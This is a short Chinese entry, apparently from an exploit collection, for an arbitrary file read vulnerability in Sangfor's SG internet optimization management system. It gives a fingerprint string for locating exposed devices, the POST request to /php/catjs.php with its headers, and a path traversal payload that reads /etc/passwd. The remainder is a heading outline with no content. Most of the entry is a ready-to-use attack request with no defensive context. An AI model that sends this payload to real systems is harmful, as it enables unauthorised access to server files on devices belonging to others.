# 深信服SG上网优化管理系统catjs存在任意文件读取漏洞

- **系统**：深信服　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="SANGFOR上网优化管理"`
- **请求**：`POST /php/catjs.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 35`

**请求体 / payload**
```
["../../../../../../../etc/passwd"]
```

**其他**
- 深信服SG上网优化管理系统catjs存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 深信服SG上网优化管理系统